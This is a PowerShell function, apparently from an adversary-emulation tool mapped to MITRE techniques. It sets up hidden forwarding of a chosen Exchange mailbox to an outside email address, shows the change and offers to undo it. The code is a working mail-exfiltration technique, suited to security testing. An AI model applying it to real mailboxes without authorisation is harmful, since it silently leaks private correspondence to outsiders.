function MailForwarding {	
    mitre_details("MailForwarding")

    #Get target mailbox
    EnterMailbox("Enter a mailbox address to setup mail forwarding from")
    $target_mailbox = $global:input_mailbox_address

    #Enter destination mailbox address
    $ExternalAccount = Read-Host -Prompt 'Enter a target email to forward the mailbox to'

    #Get-Mailbox -Identity $InternalUserName
    Write-Host "`nDisplaying existing forwarding address of mailbox $target_mailbox , if any: `n"
    Get-Mailbox -Identity $target_mailbox | Format-List -Property ForwardingSMTPAddress

    #Setup mailbox forwarding
    try {
        Write-Host "Setting up mailbox forwarding to target email address..."
        Set-Mailbox -Identity $target_mailbox -DeliverToMailboxAndForward $true -ForwardingSMTPAddress $ExternalAccount -ErrorAction Stop
        Start-Sleep -s 10
        Get-Mailbox -Identity $target_mailbox | Format-List -Property ForwardingSMTPAddress
        Write-Host "Successfully configured mailbox $target_mailbox to forward emails to $ExternalAccount!!!" @fg_yellow @bg_black
        $allow_undo = $true
    }
    catch {
        Write-Host "Error: Failed to setup forwarding on the mailbox $target_mailbox!!!" @fg_yellow @bg_black
    }
    
    #Undo changes
    if ($allow_undo -eq $true) {
        Write-Host "`n"
        $user_confirm = Read-Host -Prompt 'Would you like to undo modifications and remove mailbox forwarding (yes/no)'
        if ($user_confirm -notin "No","no","N","n") {
            Write-Host "Removing mailbox forwarding from mailbox: $target_mailbox ...`n"
            Set-Mailbox -Identity $target_mailbox -ForwardingSMTPAddress $null
            Write-Host "`nUndo successful: Removed mailbox forwarding config!!!" @fg_yellow @bg_black
        }
    }
    Pause    
}